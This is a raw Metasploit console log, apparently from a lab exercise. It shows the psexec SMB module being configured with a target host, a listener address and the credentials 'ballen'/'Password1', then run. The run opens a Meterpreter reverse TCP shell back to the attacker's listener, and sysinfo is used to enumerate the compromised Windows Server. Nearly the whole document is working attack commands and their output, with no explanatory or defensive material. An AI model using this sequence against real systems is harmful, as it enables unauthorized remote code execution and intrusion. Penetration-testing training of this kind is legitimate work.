```
msfconsole
```

```
msf > search exploit/windows/smb/psexec

Matching Modules
================

   #  Name                        Disclosure Date  Rank    Check  Description
   -  ----                        ---------------  ----    -----  -----------
   0  exploit/windows/smb/psexec  1999-01-01       manual  No     Microsoft Windows Authenticated User Code Execution
   1    \_ target: Automatic      .                .       .      .
   2    \_ target: PowerShell     .                .       .      .
   3    \_ target: Native upload  .                .       .      .
   4    \_ target: MOF upload     .                .       .      .
   5    \_ target: Command        .                .       .      .


Interact with a module by name or index. For example info 5, use 5 or use exploit/windows/smb/psexec
After interacting with a module you can manually set a TARGET with set TARGET 'Command'
```
```
msf > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
```
```
msf exploit(windows/smb/psexec) > options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   SERVICE_DESCRIPTION                    no        Service description to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SMBSHARE                               no        The share to connect to, can be an admin share (ADMIN$,C$,...) o
                                                    r a normal read/write folder share


   Used when connecting via an existing SESSION:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   no        The session to run this module on


   Used when making a new connection via RHOSTS:

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOSTS                      no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/b
                                         asics/using-metasploit.html
   RPORT      445              no        The target port (TCP)
   SMBDomain  .                no        The Windows domain to use for authentication
   SMBPass                     no        The password for the specified username
   SMBUser                     no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.217.130  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.
```
```
msf exploit(windows/smb/psexec) > set rhosts 10.48.180.77
rhosts => 10.48.180.77
```
```
msf exploit(windows/smb/psexec) > set lhost 192.168.175.163
lhost => 192.168.175.163
```
```
msf exploit(windows/smb/psexec) > set smbuser ballen
smbuser => ballen
```
```
msf exploit(windows/smb/psexec) > set smbpass Password1
smbpass => Password1
```
```
msf exploit(windows/smb/psexec) > run
[*] Started reverse TCP handler on 192.168.175.163:4444 
[*] 10.48.180.77:445 - Connecting to the server...
[*] 10.48.180.77:445 - Authenticating to 10.48.180.77:445 as user 'ballen'...
[*] 10.48.180.77:445 - Selecting PowerShell target
[*] 10.48.180.77:445 - Executing the payload...
[+] 10.48.180.77:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (177734 bytes) to 10.48.180.77
[*] Meterpreter session 1 opened (192.168.175.163:4444 -> 10.48.180.77:50765) at 2026-07-15 04:58:31 -0400
```
```
meterpreter > sysinfo
Computer        : ACME-TEST
OS              : Windows Server 2019 (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : FLASH
Logged On Users : 8
Meterpreter     : x86/windows
```
